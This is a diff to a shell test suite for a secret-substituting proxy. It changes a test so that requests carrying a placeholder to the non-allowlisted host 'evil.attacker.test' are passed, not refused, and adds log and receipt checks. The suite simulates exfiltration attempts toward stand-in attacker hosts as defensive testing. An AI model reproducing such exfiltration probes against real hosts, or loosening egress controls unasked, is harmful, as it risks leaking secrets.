@@ -208,10 +208,14 @@ assert_contains "TLS SNI/Host mismatch is refused" "$S" "STATUS 403"
 assert_not_contains "attacker did not receive the real secret (tls)" "$(received "$NET-attacker")" "$REAL"
 
 # ATTACK 3 -- honest about the destination, but it is not on the allowlist.
+# Since #12 the request goes out, carrying the PLACEHOLDER as written: nothing
+# secret is in flight, and refusing it broke `git push` of code that mentions
+# one. The bound is unchanged -- the value never reaches this host.
 start_server "$NET-attacker" "evil.attacker.test.pem"
 S=$(probe https "evil.attacker.test" "evil.attacker.test")
-assert_contains "placeholder toward a non-allowlisted host is refused" "$S" "STATUS 403"
-assert_not_contains "attacker received nothing (allowlist)" "$(received "$NET-attacker")" "$REAL"
+assert_contains "placeholder toward a non-allowlisted host passes" "$S" "STATUS 200"
+assert_not_contains "attacker received nothing real (allowlist)" "$(received "$NET-attacker")" "$REAL"
+assert_contains "attacker received only the placeholder" "$(received "$NET-attacker")" "$PLACEHOLDER"
 
 # ===========================================================================
 group "the allowlisted destination must still work"
@@ -246,6 +250,7 @@ group "the proxy log tells the truth about what it did"
 # ===========================================================================
 LOG=$(cat "$WORK/mitm.log")
 assert_contains "leak attempts are logged" "$LOG" "LEAK"
+assert_contains "the pass-through is audited as a suspect" "$LOG" "verdict=LEAK-SUSPECT"
 assert_contains "substitutions are logged" "$LOG" "SUBST"
 assert_not_contains "the log never contains the real value" "$LOG" "$REAL"
 
